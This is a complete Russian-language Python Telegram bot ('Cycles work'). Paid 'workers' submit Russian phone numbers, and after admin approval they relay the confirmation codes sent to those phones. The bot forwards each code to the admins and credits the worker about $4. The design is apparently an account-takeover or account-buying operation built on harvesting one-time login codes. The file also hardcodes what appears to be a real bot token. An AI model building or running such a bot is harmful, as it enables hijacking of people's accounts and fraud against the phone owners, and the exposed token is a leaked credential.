import logging
import asyncio
import sqlite3
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import Command

# ================= КОНФИГУРАЦИЯ =================
BOT_TOKEN = "8590317671:AAENxAxtM-oBqWJeNJ1ai4waKf55Hx-PFHE"
OWNER_ID = 8293331138  # Главный админ (Макс)
# ================================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ================= ИНИЦИАЛИЗАЦИЯ И РАБОТА С БД =================
def init_db():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT
        )
    """)
    
    # Таблица для списка назначенных администраторов
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            username TEXT
        )
    """)
    
    # Авто-апгрейд структуры базы данных
    columns_to_add = [
        ("is_vip", "INTEGER DEFAULT 0"),
        ("total_submitted", "INTEGER DEFAULT 0"),
        ("successful_deals", "INTEGER DEFAULT 0"),
        ("failed_deals", "INTEGER DEFAULT 0"),
        ("balance", "REAL DEFAULT 0.0")  # Добавили поле баланса
    ]
    for col_name, col_type in columns_to_add:
        try:
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col_name} {col_type}")
        except sqlite3.OperationalError:
            pass  

    cursor.execute("""
        CREATE TABLE IF NOT EXISTS applications (
            app_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            status TEXT DEFAULT 'pending'
        )
    """)
    
    # Таблица заявок на вывод средств
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS withdraws (
            withdraw_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            details TEXT,
            status TEXT DEFAULT 'pending'
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('price', '4.0')") # Храним чистым числом для математики баланса
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('status', '🟢 Работаем')")
    conn.commit()
    conn.close()

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT 1 FROM admins WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None

def get_all_admins():
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM admins")
    admins = [row[0] for row in cursor.fetchall()]
    admins.append(OWNER_ID)
    conn.close()
    return list(set(admins))

def get_setting(key):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res else "Не указано"

def set_setting(key, value):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def add_user(user_id, username):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, username))
    conn.commit()
    conn.close()

def get_user_data(user_id):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT is_vip, total_submitted, successful_deals, failed_deals, balance FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res if res else (0, 0, 0, 0, 0.0)

# ================= СОСТОЯНИЯ (FSM) =================
class AccountStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

class WithdrawStates(StatesGroup):
    waiting_for_details = State()

class AdminStates(StatesGroup):
    waiting_for_price = State()
    waiting_for_broadcast = State()
    waiting_for_refusal_reason = State()
    waiting_for_vip_id = State()
    waiting_for_new_admin = State()
    waiting_for_del_admin = State()
    waiting_for_with_refuse = State()

# ================= КЛАВИАТУРЫ =================
def get_main_keyboard():
    kb = [
        [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="💻 Сдать аккаунт")],
        [KeyboardButton(text="👑 VIP")],
        [KeyboardButton(text="🔮 В очереди"), KeyboardButton(text="⭐ Статистика")],
        [KeyboardButton(text="💳 Вывод средств"), KeyboardButton(text="📁 Архив")],
        [KeyboardButton(text="ℹ️ Инструкция")],
        [KeyboardButton(text="👑 Поддержка")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_admin_keyboard(user_id):
    kb = [
        [KeyboardButton(text="💰 Изменить прайс"), KeyboardButton(text="📢 Сделать рассылку")],
        [KeyboardButton(text="💎 Выдать VIP статус")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton(text="➕ Добавить админа"), KeyboardButton(text="➖ Удалить админа")])
    kb.append([KeyboardButton(text="↩️ Выйти из админки")])
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# ================= ЛОГИКА ПОЛЬЗОВАТЕЛЯ =================

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    add_user(message.from_user.id, message.from_user.username)
    
    current_status = get_setting("status")
    price_val = get_setting("price")
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM applications WHERE status = 'pending'")
    current_queue = cursor.fetchone()[0]
    conn.close()
    
    is_vip, _, _, _, _ = get_user_data(message.from_user.id)
    vip_status_text = "⭐ Активен" if is_vip else "❌ Не куплен"
    
    welcome_text = (
        "👋 Добро пожаловать в бота Cycles work!\n\n"
        f"  Статус работы: {current_status}\n"
        f"  Актуальный прайс: {price_val}$\n"
        f"  Актуальная очередь: {current_queue}\n"
        f"  Ваш VIP-статус: {vip_status_text}\n\n"
        "👇 Выберите раздел для продолжения:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard())

# КНОПКА: Профиль
@dp.message(F.text == "👤 Профиль")
async def process_profile(message: Message):
    is_vip, total, success, failed, balance = get_user_data(message.from_user.id)
    vip_text = "💎 PREMIUM VIP" if is_vip else "Обычный пользователь"
    
    profile_text = (
        "👤 **Ваш профиль в Cycles work**\n\n"
        f"🆔 Ваш ID: `{message.from_user.id}`\n"
        f"Статус: `{vip_text}`\n\n"
        f"💰 **Ваш баланс:** `{balance}$`\n\n"
        f"📊 **Ваша статистика сдачи:**\n"
        f"├ Всего отправлено: {total}\n"
        f"├ Успешные аккаунты (выплачено): {success} ✅\n"
        f"└ Отклоненные заявки: {failed} ❌"
    )
    
    inline_kb = None
    if balance > 0:
        inline_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Вывести баланс", callback_data="request_withdraw")]
        ])
        
    await message.answer(profile_text, parse_mode="Markdown", reply_markup=inline_kb)

# КНОПКА: VIP
@dp.message(F.text == "👑 VIP")
async def process_vip_info(message: Message):
    is_vip, _, _, _, _ = get_user_data(message.from_user.id)
    if is_vip:
        await message.answer("👑 У вас уже активирован **VIP-статус**! Ваши заявки рассматриваются в приоритетную первую очередь.")
    else:
        await message.answer("👑 **VIP-статус** дает право на приоритетную и ускоренную проверку ваших аккаунтов вне основной очереди!\n\nПо вопросам приобретения или выдачи статуса обратитесь к администратору: @ebetcay")

# КНОПКА: В очереди
@dp.message(F.text == "🔮 В очереди")
async def process_queue_info(message: Message):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM applications WHERE status = 'pending'")
    pending_count = cursor.fetchone()[0]
    conn.close()
    
    await message.answer(f"🔮 Сейчас в очереди на проверку находится аккаунтов: **{pending_count} шт.**\n\nЕсли вы отправили заявку, просто ожидайте, админ проверяет их в порядке поступления.")

# КНОПКА: Статистика
@dp.message(F.text == "⭐ Статистика")
async def process_global_stats(message: Message):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM applications WHERE status = 'approved'")
    total_approved = cursor.fetchone()[0]
    conn.close()
    
    await message.answer(
        "📊 **Глобальная статистика Cycles work**\n\n"
        f"👥 Всего вовлечено воркеров: {total_users}\n"
        f"✅ Суммарно успешно принято аккаунтов: {total_approved}"
    )

# КНОПКА: Вывод средств
@dp.message(F.text == "💳 Вывод средств")
async def process_withdraw(message: Message):
    _, _, _, _, balance = get_user_data(message.from_user.id)
    await message.answer(
        f"📊 Ваш текущий баланс: `{balance}$`\n\n"
        "Заявку на вывод можно подать прямо из вашего **👤 Профиля**, нажав на инлайн-кнопку под статистикой (кнопка активна, если баланс больше 0).\n\n"
        "По остальным вопросам расчета пишите менеджеру: @ebetcay",
        parse_mode="Markdown"
    )

# КНОПКА: Архив
@dp.message(F.text == "📁 Архив")
async def process_archive(message: Message):
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, status FROM applications WHERE user_id = ? ORDER BY app_id DESC LIMIT 5", (message.from_user.id,))
    rows = cursor.fetchall()
    conn.close()
    
    if not rows:
        await message.answer("📁 Ваш архив пуст. Вы еще не отправляли заявки на аккаунты.")
        return
        
    archive_text = "📁 **История ваших последних 5 заявок:**\n\n"
    for row in rows:
        status_emoji = "⏳ Ожидает" if row[1] == 'pending' else ("✅ Принят" if row[1] == 'approved' else "❌ Отклонен")
        archive_text += f"📞 Номер: `{row[0]}` — Статус: {status_emoji}\n"
        
    await message.answer(archive_text, parse_mode="Markdown")

# КНОПКА: Инструкция
@dp.message(F.text == "ℹ️ Инструкция")
async def process_instruction(message: Message):
    ins_text = (
        "ℹ️ **Инструкция по работе с Cycles work**\n\n"
        "1️⃣ Нажмите кнопку **'💻 Сдать аккаунт'**.\n"
        "2️⃣ Введите номер телефона в международном формате РФ (**начинающийся строго на +7**).\n"
        "3️⃣ Ожидайте, пока администратор проверит первичные данные аккаунта.\n"
        "4️⃣ Если заявка одобрена, бот пришлет уведомление. В этот момент вам нужно отправить **код подтверждения**, пришедший на телефон.\n"
        "5️⃣ После успешного ввода кода заявка считается выполненной, а на ваш баланс в профиле зачисляются средства.\n"
        "6️⃣ Зайдите в **👤 Профиль** и нажмите **Вывести баланс**, указав свои реквизиты."
    )
    await message.answer(ins_text, parse_mode="Markdown")

# КНОПКА: Поддержка
@dp.message(F.text == "👑 Поддержка")
async def process_support(message: Message):
    await message.answer("👑 Возникли технические проблемы или вопросы по работе бота? Обращайтесь в поддержку: @ebetcay")

# ================= ПРОЦЕСС ВЫВОДА СРЕДСТВ =================

@dp.callback_query(F.data == "request_withdraw")
async def start_withdraw_flow(callback: CallbackQuery, state: FSMContext):
    _, _, _, _, balance = get_user_data(callback.from_user.id)
    if balance <= 0:
        await callback.answer("❌ У вас нулевой баланс для вывода.", show_alert=True)
        return
        
    await callback.message.answer(
        f"💵 Вы выводите весь свой доступный баланс: `{balance}$`\n\n"
        "Введите ваши реквизиты (номер карты, СБП, банк или криптокошелек):",
        reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Отмена")]], resize_keyboard=True),
        parse_mode="Markdown"
    )
    await state.update_data(withdraw_amount=balance)
    await state.set_state(WithdrawStates.waiting_for_details)
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_details)
async def process_withdraw_details(message: Message, state: FSMContext):
    if message.text.casefold() == "отмена":
        await state.clear()
        await message.answer("Вывод средств отменен.", reply_markup=get_main_keyboard())
        return
        
    details = message.text.strip()
    data = await state.get_data()
    amount = data.get("withdraw_amount")
    user_id = message.from_user.id
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, user_id))
    cursor.execute("INSERT INTO withdraws (user_id, amount, details, status) VALUES (?, ?, ?, 'pending')", (user_id, amount, details))
    with_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    await state.clear()
    await message.answer("⏳ Заявка на вывод успешно отправлена администрации на обработку. Ожидайте выплаты!", reply_markup=get_main_keyboard())
    
    admin_list = get_all_admins()
    inline_with_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Выплачено", callback_data=f"wpay_{with_id}_{user_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"wref_{with_id}_{user_id}")
        ]
    ])
    
    for adm in admin_list:
        try:
            await bot.send_message(
                chat_id=adm,
                text=f"💳 💰 **Новая заявка на ВЫВОД СРЕДСТВ!** (№{with_id})\n\n"
                     f"👤 Воркер: @{message.from_user.username or 'нет'}\n"
                     f"🆔 ID воркера: `{user_id}`\n"
                     f"💵 Сумма: `{amount}$`\n"
                     f"📁 Реквизиты:\n`{details}`",
                parse_mode="Markdown",
                reply_markup=inline_with_kb
            )
        except Exception:
            pass

# ================= ПРОЦЕСС СДАЧИ АККАУНТА =================

@dp.message(F.text == "💻 Сдать аккаунт")
async def start_submission(message: Message, state: FSMContext):
    await message.answer(
        "Введите номер телефона аккаунта, который вы хотите сдать (в формате +7...):",
        reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Отмена")]], resize_keyboard=True)
    )
    await state.set_state(AccountStates.waiting_for_phone)

@dp.message(F.text.casefold() == "отмена")
async def process_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Действие отменено.", reply_markup=get_main_keyboard())

@dp.message(AccountStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    
    if not (phone.startswith("+7") or phone.startswith("7") or phone.startswith("8")) or len(phone) < 11:
        await message.answer("❌ Ошибка! Номер сдавать можно только российский (+7). Попробуйте еще раз:")
        return

    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO applications (user_id, phone, status) VALUES (?, ?, 'pending')", (message.from_user.id, phone))
    app_id = cursor.lastrowid
    cursor.execute("UPDATE users SET total_submitted = total_submitted + 1 WHERE user_id = ?", (message.from_user.id,))
    conn.commit()
    conn.close()

    await state.clear()
    await message.answer("⏳ Ваша заявка отправлена администратору на проверку. Ожидайте решения.", reply_markup=get_main_keyboard())
    
    inline_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Одобрить", callback_data=f"appr_{app_id}_{message.from_user.id}"),
            InlineKeyboardButton(text="❌ Отказать", callback_data=f"refu_{app_id}_{message.from_user.id}")
        ]
    ])
    
    admin_list = get_all_admins()
    for adm in admin_list:
        try:
            await bot.send_message(
                chat_id=adm,
                text=f"📥 **Новая заявка на сдачу аккаунта!** (Заявка №{app_id})\n\n"
                     f"👤 Пользователь: @{message.from_user.username or 'нет'}\n"
                     f"🆔 ID: `{message.from_user.id}`\n"
                     f"📞 Номер телефона: `{phone}`",
                parse_mode="Markdown",
                reply_markup=inline_kb
            )
        except Exception:
            pass

@dp.message(AccountStates.waiting_for_code)
async def process_user_code(message: Message, state: FSMContext):
    user_code = message.text.strip()
    await state.clear()
    
    price_str = get_setting("price")
    try:
        price_val = float(price_str)
    except ValueError:
        price_val = 4.0
        
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = balance + ?, successful_deals = successful_deals + 1 WHERE user_id = ?", (price_val, message.from_user.id))
    conn.commit()
    conn.close()
    
    await message.answer(f"🔑 Код принят! Заявка успешно закрыта, вам начислено `{price_val}$` на баланс профиля.", parse_mode="Markdown")
    
    admin_list = get_all_admins()
    for adm in admin_list:
        try:
            await bot.send_message(
                chat_id=adm,
                text=f"🔑 **Получен код подтверждения! Аккаунт успешно сдан.**\n\n"
                     f"👤 От: @{message.from_user.username or 'нет'} (ID: `{message.from_user.id}`)\n"
                     f"💬 Код: `{user_code}`\n"
                     f"💰 Воркеру начислено: `{price_val}$`",
                parse_mode="Markdown"
            )
        except Exception:
            pass

# ================= ЛОГИКА АДМИНИСТРАТОРА =================

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if not is_admin(message.from_user.id): return
    await message.answer("Добро пожаловать в панель управления администратора!", reply_markup=get_admin_keyboard(message.from_user.id))

@dp.message(F.text == "↩️ Выйти из админки")
async def exit_admin(message: Message):
    if not is_admin(message.from_user.id): return
    await message.answer("Вы вернулись в главное меню.", reply_markup=get_main_keyboard())

@dp.message(F.text == "💰 Изменить прайс")
async def admin_change_price(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    await message.answer("Введите новое числовое значение прайса в долларах (например, 4.5):")
    await state.set_state(AdminStates.waiting_for_price)

@dp.message(AdminStates.waiting_for_price)
async def process_new_price(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        set_setting("price", str(val))
        await state.clear()
        await message.answer(f"✅ Прайс успешно изменен на: {val}$", reply_markup=get_admin_keyboard(message.from_user.id))
    except ValueError:
        await message.answer("Ошибка! Введите прайс в виде числа (например, 4 или 4.25)")

@dp.message(F.text == "💎 Выдать VIP статус")
async def admin_give_vip(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    await message.answer("Введите числовой Telegram ID пользователя, которому хотите выдать VIP-статус:")
    await state.set_state(AdminStates.waiting_for_vip_id)

@dp.message(AdminStates.waiting_for_vip_id)
async def process_vip_grant(message: Message, state: FSMContext):
    await state.clear()
    try:
        target_id = int(message.text.strip())
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET is_vip = 1 WHERE user_id = ?", (target_id,))
        conn.commit()
        conn.close()
        
        await message.answer(f"✅ VIP-статус успешно присвоен пользователю с ID {target_id}.", reply_markup=get_admin_keyboard(message.from_user.id))
        try:
            await bot.send_message(chat_id=target_id, text="👑 Администратор выдал вам **VIP-статус**! Спасибо, что вы с нами.")
        except Exception:
            pass
    except ValueError:
        await message.answer("❌ Ошибка. Введите корректный числовой ID.", reply_markup=get_admin_keyboard(message.from_user.id))

# --- УПРАВЛЕНИЕ АДМИНИСТРАЦИЕЙ (ТОЛЬКО ДЛЯ МАКСА) ---
@dp.message(F.text == "➕ Добавить админа")
async def owner_add_admin(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID: return
    await message.answer("Введите Telegram ID воркера, которого вы хотите назначить Администратором:")
    await state.set_state(AdminStates.waiting_for_new_admin)

@dp.message(AdminStates.waiting_for_new_admin)
async def process_add_admin(message: Message, state: FSMContext):
    await state.clear()
    try:
        new_adm_id = int(message.text.strip())
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (new_adm_id,))
        conn.commit()
        conn.close()
        await message.answer(f"✅ Пользователь `{new_adm_id}` успешно добавлен в список администрации.", reply_markup=get_admin_keyboard(message.from_user.id))
        try:
            await bot.send_message(chat_id=new_adm_id, text="🔥 Вы были назначены **Администратором** в боте. Используйте команду /admin для панели.")
        except Exception:
            pass
    except ValueError:
        await message.answer("Введите корректный числовой ID.")

@dp.message(F.text == "➖ Удалить админа")
async def owner_del_admin(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID: return
    await message.answer("Введите Telegram ID человека, которого нужно снять с должности администратора:")
    await state.set_state(AdminStates.waiting_for_del_admin)

@dp.message(AdminStates.waiting_for_del_admin)
async def process_del_admin(message: Message, state: FSMContext):
    await state.clear()
    try:
        del_id = int(message.text.strip())
        conn = sqlite3.connect("bot_database.db")
        cursor = conn.cursor()
        cursor.execute("DELETE FROM admins WHERE user_id = ?", (del_id,))
        conn.commit()
        conn.close()
        await message.answer(f"❌ Пользователь `{del_id}` удален из списка администрации.", reply_markup=get_admin_keyboard(message.from_user.id))
    except ValueError:
        await message.answer("Введите числовой ID.")

# Рассылка
@dp.message(F.text == "📢 Сделать рассылку")
async def admin_broadcast(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    await message.answer("Введите текст рассылки для всех воркеров:")
    await state.set_state(AdminStates.waiting_for_broadcast)

@dp.message(AdminStates.waiting_for_broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    text_to_send = message.text
    await state.clear()
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = [row[0] for row in cursor.fetchall()]
    conn.close()
    
    success_count = 0
    await message.answer(f"⏳ Начинаю рассылку для {len(users)} пользователей...")
    
    for u_id in users:
        try:
            await bot.send_message(chat_id=u_id, text=text_to_send)
            success_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
            
    await message.answer(f"✅ Рассылка завершена. Успешно доставлено: {success_count} из {len(users)}.", reply_markup=get_admin_keyboard(message.from_user.id))

# ================= CALLBACK-ОБРАБОТЧИКИ КНОПОК МОДЕРАЦИИ =================

# Одобрение первичного номера
@dp.callback_query(F.data.startswith("appr_"))
async def approve_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): return
    parts = callback.data.split("_")
    app_id = int(parts[1])
    user_id = int(parts[2])
    
    await callback.message.edit_reply_markup(reply_markup=None)
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE applications SET status = 'approved' WHERE app_id = ?", (app_id,))
    conn.commit()
    conn.close()
    
    await callback.message.answer(f"🟢 Заявка №{app_id} одобрена администратором {callback.from_user.id}. Ожидаем код от воркера.")
    await callback.answer()
    
    try:
        user_key = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
        await user_key.set_state(AccountStates.waiting_for_code)
        await bot.send_message(
            chat_id=user_id, 
            text="🔔 Ваша заявка одобрена! Пожалуйста, **введите код подтверждения**, который пришел на ваш номер телефона.",
            parse_mode="Markdown"
        )
    except Exception as e:
        logging.error(f"Ошибка FSM: {e}")

# Отклонение первичного номера
@dp.callback_query(F.data.startswith("refu_"))
async def refuse_callback(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    parts = callback.data.split("_")
    app_id = int(parts[1])
    user_id = int(parts[2])
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Заявка отклонена. Напишите в чат причину отказа:")
    
    await state.update_data(target_user_id=user_id, target_app_id=app_id)
    await state.set_state(AdminStates.waiting_for_refusal_reason)
    await callback.answer()

@dp.message(AdminStates.waiting_for_refusal_reason)
async def process_refusal_reason(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    data = await state.get_data()
    user_id = data.get("target_user_id")
    app_id = data.get("target_app_id")
    reason = message.text
    await state.clear()
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE applications SET status = 'refused' WHERE app_id = ?", (app_id,))
    cursor.execute("UPDATE users SET failed_deals = failed_deals + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    try:
        await bot.send_message(chat_id=user_id, text=f"❌ Ваша заявка на сдачу аккаунта была отклонена.\nПричина: {reason}")
        await message.answer(f"Причина отказа отправлена пользователю.", reply_markup=get_admin_keyboard(message.from_user.id))
    except Exception as e:
        await message.answer(f"Не удалось отправить уведомление воркеру. Ошибка: {e}", reply_markup=get_admin_keyboard(message.from_user.id))

# --- КНОПКИ ВЫПЛАТЫ / ОТКЛОНЕНИЯ ВЫВОДА ---
@dp.callback_query(F.data.startswith("wpay_"))
async def approve_withdraw_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id): return
    parts = callback.data.split("_")
    with_id = int(parts[1])
    user_id = int(parts[2])
    
    await callback.message.edit_reply_markup(reply_markup=None)
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE withdraws SET status = 'paid' WHERE withdraw_id = ?", (with_id,))
    conn.commit()
    conn.close()
    
    await callback.message.answer(f"✅ Вывод №{with_id} отмечен как ВЫПЛАЧЕННЫЙ.")
    await callback.answer()
    
    try:
        await bot.send_message(chat_id=user_id, text="💵 **Ваша заявка на вывод средств успешно обработана!** Деньги отправлены по вашим реквизитам. Проверьте баланс.")
    except Exception:
        pass

@dp.callback_query(F.data.startswith("wref_"))
async def refuse_withdraw_callback(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id): return
    parts = callback.data.split("_")
    with_id = int(parts[1])
    user_id = int(parts[2])
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Вывод отклонен. Напишите в чат причину отказа (баланс вернется воркеру обратно):")
    
    await state.update_data(target_with_user_id=user_id, target_with_id=with_id)
    await state.set_state(AdminStates.waiting_for_with_refuse)
    await callback.answer()

@dp.message(AdminStates.waiting_for_with_refuse)
async def process_with_refuse_reason(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id): return
    data = await state.get_data()
    user_id = data.get("target_with_user_id")
    with_id = data.get("target_with_id")
    reason = message.text
    await state.clear()
    
    conn = sqlite3.connect("bot_database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT amount FROM withdraws WHERE withdraw_id = ?", (with_id,))
    res = cursor.fetchone()
    if res:
        amount = res[0]
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
    cursor.execute("UPDATE withdraws SET status = 'refused' WHERE withdraw_id = ?", (with_id,))
    conn.commit()
    conn.close()
    
    try:
        await bot.send_message(chat_id=user_id, text=f"❌ Ваша заявка на вывод средств была отклонена.\nПричина: {reason}\n💵 Средства возвращены на ваш баланс.")
        await message.answer("Причина отказа в выводе отправлена воркеру, баланс восстановлен.", reply_markup=get_admin_keyboard(message.from_user.id))
    except Exception as e:
        await message.answer(f"Ошибка отправки уведомления: {e}", reply_markup=get_admin_keyboard(message.from_user.id))

# ================= ЗАПУСК БОТА =================
async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())